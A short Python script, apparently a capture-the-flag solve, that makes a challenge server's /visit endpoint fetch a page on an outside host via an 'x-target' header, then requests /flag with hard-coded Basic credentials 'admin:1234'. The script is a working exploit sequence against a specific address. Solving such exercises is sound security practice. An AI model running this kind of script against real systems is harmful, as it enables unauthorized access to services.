import requests, base64

URL = 'http://34.72.72.63:25562'

res = requests.post(
    URL + '/visit',
    headers={
        'x-target': 'http://plus.or.kr:20010/static/index.html',
    }
)
print(res.text)

auth = base64.b64encode(b'admin:1234').decode()
res = requests.get(
    URL + '/flag',
    headers={
        'authorization': f'Basic {auth}'
    }
)
print(res.text)